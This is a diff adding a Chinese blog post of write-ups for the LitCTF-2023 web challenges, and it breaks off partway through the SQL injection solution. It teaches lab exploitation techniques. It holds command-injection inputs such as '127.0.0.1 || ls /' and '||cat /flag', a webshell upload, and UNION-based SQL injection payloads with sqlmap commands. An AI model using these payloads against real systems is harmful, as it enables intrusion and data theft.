@@ -161,6 +161,456 @@ A:会的，会的兄弟。博主接下来会逐步更新自己的日常，慢慢
 &lt;h2&gt;结语&lt;/h2&gt;
 &lt;p&gt;&amp;lt;font color=grey&amp;gt;&lt;s&gt;我重生了，重生在暑假的最后一天。上一世被主人丢弃被活活饿死，这一世一定要发挥出自己的作用，好好活下去&lt;/s&gt;&amp;lt;/font&amp;gt;&lt;/p&gt;
 &lt;p&gt;新站开业，请多关照~&lt;/p&gt;
+</content:encoded></item><item><title>【易】【LitCTF-2023】Web题目 WriteUp 合集</title><link>https://www.chuzoux.top/posts/litctf-2023/</link><guid isPermaLink="true">https://www.chuzoux.top/posts/litctf-2023/</guid><description>【LitCTF-2023】Web题目 的 WriteUp 总体题目简单 适合入门学习</description><pubDate>Fri, 14 Nov 2025 20:33:50 GMT</pubDate><content:encoded>&lt;h1&gt;【LitCTF-2023】Web题目 WriteUp 合集&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;题目链接：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.nssctf.cn/problem/3861&quot;&gt;[LitCTF 2023]我Flag呢？&lt;/a&gt;            &lt;a href=&quot;#litctf-2023%E6%88%91flag%E5%91%A2&quot;&gt;WriteUp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.nssctf.cn/problem/3862&quot;&gt;[LitCTF 2023]就当无事发生 &lt;/a&gt;            &lt;a href=&quot;#litctf-2023%E5%B0%B1%E5%BD%93%E6%97%A0%E4%BA%8B%E5%8F%91%E7%94%9F&quot;&gt;WriteUp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.nssctf.cn/problem/3863&quot;&gt;[LitCTF 2023]导弹迷踪 &lt;/a&gt;            &lt;a href=&quot;#litctf-2023%E5%AF%BC%E5%BC%B9%E8%BF%B7%E8%B8%AA&quot;&gt;WriteUp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.nssctf.cn/problem/3864&quot;&gt;[LitCTF 2023]Follow me and hack me&lt;/a&gt;            &lt;a href=&quot;#litctf-2023follow-me-and-hack-me&quot;&gt;WriteUp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.nssctf.cn/problem/3873&quot;&gt;[LitCTF 2023]Ping&lt;/a&gt;            &lt;a href=&quot;#litctf-2023ping&quot;&gt;WriteUp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.nssctf.cn/problem/3871&quot;&gt;[LitCTF 2023]1zjs&lt;/a&gt;            &lt;a href=&quot;#litctf-20231zjs&quot;&gt;WriteUp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.nssctf.cn/problem/3867&quot;&gt;[LitCTF 2023]作业管理系统 &lt;/a&gt;            &lt;a href=&quot;#litctf-2023%E4%BD%9C%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F&quot;&gt;WriteUp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.nssctf.cn/problem/3865&quot;&gt;[LitCTF 2023]PHP是世界上最好的语言！！&lt;/a&gt;            &lt;a href=&quot;#litctf-2023php%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80&quot;&gt;WriteUp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.nssctf.cn/problem/3866&quot;&gt;[LitCTF 2023]Vim yyds&lt;/a&gt;            &lt;a href=&quot;#litctf-2023vim-yyds&quot;&gt;WriteUp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.nssctf.cn/problem/3868&quot;&gt;[LitCTF 2023]这是什么？SQL ！注一下 ！&lt;/a&gt;            &lt;a href=&quot;#litctf-2023%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88sql-%E6%B3%A8%E4%B8%80%E4%B8%8B-&quot;&gt;WriteUp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.nssctf.cn/problem/3872&quot;&gt;[LitCTF 2023]Flag点击就送！&lt;/a&gt;            &lt;a href=&quot;#litctf-2023flag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81&quot;&gt;WriteUp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.nssctf.cn/problem/3870&quot;&gt;[LitCTF 2023]彩蛋&lt;/a&gt;            &lt;a href=&quot;#litctf-2023%E5%BD%A9%E8%9B%8B&quot;&gt;WriteUp&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;【LitCTF 2023】我Flag呢？&lt;/h2&gt;
+&lt;h3&gt;题目知识标签&lt;/h3&gt;
+&lt;p&gt;信息收集、源码泄漏、代码审计&lt;/p&gt;
+&lt;h3&gt;WP&lt;/h3&gt;
+&lt;p&gt;直接代码审计F12或CTRL+U查看源代码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../assets/images/%E3%80%90LitCTF-2023%E3%80%91Web%E9%A2%98%E7%9B%AE%20WriteUp%20%E5%90%88%E9%9B%86-1.png&quot; alt=&quot;&quot; /&gt;
+在代码注释找到flag&lt;/p&gt;
+&lt;h3&gt;FLAG&lt;/h3&gt;
+&lt;p&gt;NSSCTF{91737e4e-5797-4afb-80de-e6ec1c8f0177}&lt;/p&gt;
+&lt;h3&gt;CTF所用工具总结&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;浏览器&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;难度&lt;/h3&gt;
+&lt;p&gt;※（一颗星，送分）&lt;/p&gt;
+&lt;h2&gt;【LitCTF 2023】就当无事发生&lt;/h2&gt;
+&lt;h3&gt;题目知识标签&lt;/h3&gt;
+&lt;p&gt;.git泄露、信息收集&lt;/p&gt;
+&lt;h3&gt;WP&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;../assets/images/%E3%80%90LitCTF-2023%E3%80%91Web%E9%A2%98%E7%9B%AE%20WriteUp%20%E5%90%88%E9%9B%86-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;在题目描述页面可以发现一个GitHub page
+根据下面的描述可以了解到作者不小心（并非）将flag推送到了仓库 但后来又重新部署 可以猜测到flag存在于仓库的历史版本&lt;/p&gt;
+&lt;p&gt;根据GitHub page的特点 可以很快找到作者github主页
+从而找到对应的github仓库&lt;/p&gt;
+&lt;p&gt;::github{repo=&quot;ProbiusOfficial/ProbiusOfficial.github.io&quot;}&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023.CVJwV7Jj.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;在仓库的commits中可以找到历史推送
+经过查找 可以找到历史推送遗留的flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-1.DmDZx2wY.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-2.B7RRBfJc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;FLAG&lt;/h3&gt;
+&lt;p&gt;NSSCTF{g1thub_c0mmit_1s_s0_us3ful}&lt;/p&gt;
+&lt;h3&gt;CTF所用工具总结&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;浏览器&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;难度&lt;/h3&gt;
+&lt;p&gt;※※（两颗星，超简单）&lt;/p&gt;
+&lt;h2&gt;【LitCTF 2023】导弹迷踪&lt;/h2&gt;
+&lt;h3&gt;题目知识标签&lt;/h3&gt;
+&lt;p&gt;JS分析、信息收集、源码泄漏&lt;/p&gt;
+&lt;h3&gt;WP&lt;/h3&gt;
+&lt;p&gt;根据题目描述可知 我们可以分析js得出flag 也可以玩到第六关得出flag
+&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-3.CItFXv3Q.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;方法一：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;玩到第六关，然后拿到flag&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;方法二：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;代码审计 我们可以发现有好几个 关于游戏类的js&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-4.UqD4olDv.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;我们可以根据名称大致筛选出更有可能藏有flag的js进行分析
+这里根据名称 猜测出藏在src/main.js src/game.js中&lt;/p&gt;
+&lt;p&gt;于是开始分析js文件&lt;/p&gt;
+&lt;p&gt;打开src/game.js文件
+思路：当我们玩到第六关的时候会弹出flag 所以我们可以猜测他有个变量存储关卡 然后判断变量值是否为6 同时 游戏一般以level来表示关卡数 我们便可以猜测变量名称与level相关&lt;/p&gt;
+&lt;p&gt;所以我们在js文件中检索&quot;if(xxxx === 6)&quot;类似的东西
+我这里直接在js文件中搜索6 很幸运的直接找到了flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-5.CWh_lYVj.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;FLAG&lt;/h3&gt;
+&lt;p&gt;NSSCTF{y0u_w1n_th1s_!!!}&lt;/p&gt;
+&lt;h3&gt;CTF所用工具总结&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;浏览器&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;难度&lt;/h3&gt;
+&lt;p&gt;※※（两颗星，超简单）&lt;/p&gt;
+&lt;h2&gt;【LitCTF 2023】Follow me and hack me&lt;/h2&gt;
+&lt;h3&gt;题目知识标签&lt;/h3&gt;
+&lt;p&gt;HTTP协议、POST注入、源码泄漏&lt;/p&gt;
+&lt;h3&gt;WP&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-7.BR-VFz23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;我们发现按钮不能使用 打开开发者工具进行代码审计
+可以发现这个题就没打算让大家用按钮&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-8.vfPSX1cr.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;不过我们可以直接对页面进行传参
+我们可以使用hackbar插件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-9.DNc_rUi1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;直接用hackbar进行post请求 同时传入get参数
+输入完之后直接EXECUTE 得到flag&lt;/p&gt;
+&lt;h3&gt;FLAG&lt;/h3&gt;
+&lt;p&gt;NSSCTF{53c511ed-8493-4622-b87d-f5f1fdbc5013}&lt;/p&gt;
+&lt;h3&gt;CTF所用工具总结&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;浏览器&lt;/li&gt;
+&lt;li&gt;HackBar插件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;难度&lt;/h3&gt;
+&lt;p&gt;※※（两颗星，超简单）&lt;/p&gt;
+&lt;h2&gt;【LitCTF 2023】Ping&lt;/h2&gt;
+&lt;h3&gt;题目知识标签&lt;/h3&gt;
+&lt;p&gt;RCE、前端绕过、Linux命令&lt;/p&gt;
+&lt;h3&gt;WP&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-10.CFqOnLBD.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;我们尝试ping一下127.0.0.1&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-11.Bc0_NeOd.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;我们可以猜测到当我们输入“127.0.0.1”时 被拼接为“ping 127.0.0.1&quot;
+根据Linux的特点 我们可以使用命令连接符 然后运行我们想要的指令&lt;/p&gt;
+&lt;p&gt;关于&lt;strong&gt;linux命令连接符&lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;Linux命令连接符主要有以下几种：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;;&lt;/code&gt;（分号）：表示顺序执行，每个命令执行完毕后继续执行下一个命令。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;（逻辑与）：表示顺序执行，只有前一个命令执行成功后，才会执行下一个命令。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;||&lt;/code&gt;（逻辑或）：表示顺序执行，只有前一个命令执行失败后，才会执行下一个命令。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;（与符号）：表示在后台执行命令。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;|&lt;/code&gt;（管道符号）：表示将前一个命令的输出作为输入传递给下一个命令。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;我们可以使用“||”连接我们先要的命令&lt;/p&gt;
+&lt;p&gt;当我们传入&quot;127.0.0.1 || ls /&quot; 命令会被拼接为“ping 127.0.0.1 || ls /” 运行“ls /”命令
+于是进行尝试&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-12.B5BTIzlF.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;这里可以了解到他进行了前端的验证
+不过我们可以通过修改数据包或禁用js脚本进行发送数据&lt;/p&gt;
+&lt;p&gt;这里使用burp suite&lt;/p&gt;
+&lt;p&gt;我们先输入正常ip绕过js验证 然后抓取数据包修改&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-13.COZeCVdr.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;抓取到数据包后 我们修改post里面的内容&lt;/p&gt;
+&lt;p&gt;将“127.0.0.1”改为“127.0.0.1 || ls /“&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-14.ChmKiwB9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;ok 我们这里发现命令运行成功而且正常回显
+我们发现目录根目录中有个flag文件
+使用cat命令读取&lt;/p&gt;
+&lt;p&gt;使用同样的方法将cat命令拼接进去“||cat /flag”&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-15.C6wj_EV9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;FLAG&lt;/h3&gt;
+&lt;p&gt;NSSCTF{f2166a2a-76f5-451c-8396-e2a445df2afe}&lt;/p&gt;
+&lt;h3&gt;CTF所用工具总结&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;浏览器&lt;/li&gt;
+&lt;li&gt;burp suite&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;难度&lt;/h3&gt;
+&lt;p&gt;※※※（三颗星，简单）&lt;/p&gt;
+&lt;h2&gt;【LitCTF 2023】1zjs&lt;/h2&gt;
+&lt;h3&gt;题目知识标签&lt;/h3&gt;
+&lt;p&gt;JS分析、信息收集、代码审计&lt;/p&gt;
+&lt;h3&gt;WP&lt;/h3&gt;
+&lt;p&gt;代码审计可以找到一个js
+分析js&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-17.BCRPTdKj.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;找到了一个名为 /f@k3f1ag.php 的文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-18.f-5qqmiT.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;（f@k3我还以为是fake 以为找错了 实际上是Fuck的意思 意为JSFuck编码）
+打开发现如下内容&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-19.CWAg-n__.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;全部是由[] + ! ()组成&lt;br /&gt;
+看似毫无意义 但flag却正在如此&lt;/p&gt;
+&lt;p&gt;由亲爱的百度先生可以了解到这是jsfuck编码&lt;br /&gt;
+（是我孤陋寡闻了）&lt;/p&gt;
+&lt;p&gt;JSFuck是基于JavaScript原子部分的深奥和教育性编程风格。它仅仅使用六个不同的字符来编写和执行代码。&lt;/p&gt;
+&lt;p&gt;由csdn可知&lt;br /&gt;
+它不依赖于浏览器，因此可以在Node.js上运行。&lt;/p&gt;
+&lt;p&gt;方法一：直接在控制台运行
+&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-20.BKrJePF8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;方法二：解码网站
+&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-21.DEsE_tsE.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;FLAG&lt;/h3&gt;
+&lt;p&gt;NSSCTF{a07be3a8-e644-4683-bd14-57ff63c7e21e}&lt;/p&gt;
+&lt;h3&gt;CTF所用工具总结&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;浏览器&lt;/li&gt;
+&lt;li&gt;burp suite&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;难度&lt;/h3&gt;
+&lt;p&gt;※※※※（四颗星，一般）&lt;/p&gt;
+&lt;h2&gt;【LitCTF 2023】作业管理系统&lt;/h2&gt;
+&lt;h3&gt;题目知识标签&lt;/h3&gt;
+&lt;p&gt;文件上传、弱口令、RCE&lt;/p&gt;
+&lt;h3&gt;WP&lt;/h3&gt;
+&lt;p&gt;打开题目发现是登录页面
+代码审计可以发现账号密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-22.YTPx_n2C.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;输入账号密码进行登录&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-23.CIAQH8Xc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;在上传文件页面进行一句话木马上传
+上传成功之后使用蚁剑连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-24.5QQvr0Kv.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;在根目录可以找到flag文件得取flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-25.ndtc0vYZ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;FLAG&lt;/h3&gt;
+&lt;p&gt;NSSCTF{b93762f3-5377-481f-85e1-54d696776843}&lt;/p&gt;
+&lt;h3&gt;CTF所用工具总结&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;浏览器&lt;/li&gt;
+&lt;li&gt;AntSword&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;难度&lt;/h3&gt;
+&lt;p&gt;※※※（三颗星，简单）&lt;/p&gt;
+&lt;h2&gt;【LitCTF 2023】PHP是世界上最好的语言！！&lt;/h2&gt;
+&lt;h3&gt;题目知识标签&lt;/h3&gt;
+&lt;p&gt;RCE、PHP、无参RCE&lt;/p&gt;
+&lt;h3&gt;WP&lt;/h3&gt;
+&lt;p&gt;题目简介提示：Flag位于根目录
+思路就是找根目录里面的flag文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-26.iwFGLRtW.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;根据页面提示 &lt;strong&gt;RUN CODE&lt;/strong&gt; 提示我们框内应为什么命令
+我们尝试运行php代码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-27.C_drsf80.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;发现可以运行 通过Linux命令 ls / 和cat来查看flag文件得到flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-28.mpFLGM9W.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;FLAG&lt;/h3&gt;
+&lt;p&gt;NSSCTF{5c5b0c25-526d-4fb2-8fe8-82a44b59a673}&lt;/p&gt;
+&lt;h3&gt;CTF所用工具总结&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;浏览器&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;难度&lt;/h3&gt;
+&lt;p&gt;※※※（三颗星，简单）&lt;/p&gt;
+&lt;h2&gt;【LitCTF 2023】Vim yyds&lt;/h2&gt;
+&lt;h3&gt;题目知识标签&lt;/h3&gt;
+&lt;p&gt;vim泄漏、RCE、源码泄漏&lt;/p&gt;
+&lt;h3&gt;WP&lt;/h3&gt;
+&lt;p&gt;题目打开提示vim&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-29.CGQzZny7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;这边可以猜测vim泄露 文件后缀为.swp 即index.php.swp
+如果我们不知道也可以用 &lt;strong&gt;dirsearch&lt;/strong&gt; 工具进行扫描&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-30.DF5DpjP8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;指令为 dirsearch -u {目标url}
+可以扫描出index.php.swp文件 这里尝试访问
+下载到目标文件 使用010 editor打开分析&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-31.8DmHImx2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;分析代码得出payload&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-32.D_8N4ymK.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;使用post请求 传参
+cmd={linux命令}&amp;amp;password=R2l2ZV9NZV9Zb3VyX0ZsYWc=
+使用ls / 找到根目录flag文件
+使用cat /flag 读取文件得到flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-33.CTpuaux_.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;FLAG&lt;/h3&gt;
+&lt;p&gt;NSSCTF{26723c05-e07b-44bd-a6c0-e9949452abcb}&lt;/p&gt;
+&lt;h3&gt;CTF所用工具总结&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;浏览器&lt;/li&gt;
+&lt;li&gt;hack bar&lt;/li&gt;
+&lt;li&gt;dirsearch&lt;/li&gt;
+&lt;li&gt;010 editor&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;难度&lt;/h3&gt;
+&lt;p&gt;※※※※（四颗星，一般）&lt;/p&gt;
+&lt;h2&gt;【LitCTF 2023】这是什么？SQL ！注一下 ！&lt;/h2&gt;
+&lt;h3&gt;题目知识标签&lt;/h3&gt;
+&lt;p&gt;SQL注入、时间盲注、布尔盲注&lt;/p&gt;
+&lt;h3&gt;WP&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;方法一：手动注入&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;这题目比较简单 直接把Key Source给出&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.&apos;((((((&apos;.$_GET[&quot;id&quot;].&apos;))))))&apos;;
+$result = $conn-&amp;gt;query($sql);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Executed Operations:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;SELECT username,password FROM users WHERE id = (((((())))))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们可以直接得出是字符型 然后需要“))))))”进行闭合
+而且可以由 SELECT &lt;strong&gt;username,password&lt;/strong&gt; FROM 得出字段长度为 2&lt;/p&gt;
+&lt;p&gt;接下来就要判断注释符&lt;/p&gt;
+&lt;p&gt;尝试 “--”：
+&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-34.Da7OTS-u.png&quot; alt=&quot;&quot; /&gt;
+查询出错 注释符不是“--”&lt;/p&gt;
+&lt;p&gt;尝试“#”：
+&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-35.1jXDL2hF.png&quot; alt=&quot;&quot; /&gt;
+查询成功 注释符是&quot;#&quot;&lt;/p&gt;
+&lt;p&gt;接下来就可以依次构建payload
+手动注入可以使用hackbar内预设语句&lt;/p&gt;
+&lt;p&gt;查库payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?id=1)))))) union select 1,group_concat(schema_name) from information_schema.schemata %23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-36.DcZ0gTDQ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;查库 长度和回显位置 这个题测试后发现1和2位置都能进行回显
+直接execute 发现查询失败 分析查询语句&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-37.Cwi2Hym0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;我们可以发现 hackbar 中的 # 被忽略
+这边使用 # 的url编码即可&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-38.DEmZwRFs.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;查询到以下数据库
+information_schema,mysql,ctftraining,performance_schema,test,ctf&lt;/p&gt;
+&lt;p&gt;然后就是常规的查表查列查数据 不进行过多解释了
+这里选择ctftraining数据库 它名称比较可疑 如果不是可以再进行其他数据库尝试&lt;/p&gt;
+&lt;p&gt;查表payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?id=1)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;ctftraining&quot; %23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-39.DBUJC0wJ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;找到了一个名为flag的表
+查列payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?id=1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos; and table_schema=&apos;ctftraining&apos; %23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-40.YPe4c-vp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;接下来直接查询数据即可
+查数据payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?id=1)))))) union select 1,flag from ctftraining.flag %23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-41.DGQL7uyX.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;得出flag&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;方法二：sqlmap注入&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;直接查库&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python sqlmap.py -u http://node5.anna.nssctf.cn:23615/?id=1 --dbs
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-42.CtgHy916.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;查表&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python sqlmap.py -u http://node5.anna.nssctf.cn:23615/?id=1 -D ctftraining --tables
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;（触发时间盲注 速度较慢）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-43.brCJH4q3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;查列&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python sqlmap.py -u http://node5.anna.nssctf.cn:23615/?id=1 -D ctftraining -T flag --columns
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;（触发时间盲注 速度较慢）&lt;/p&gt;
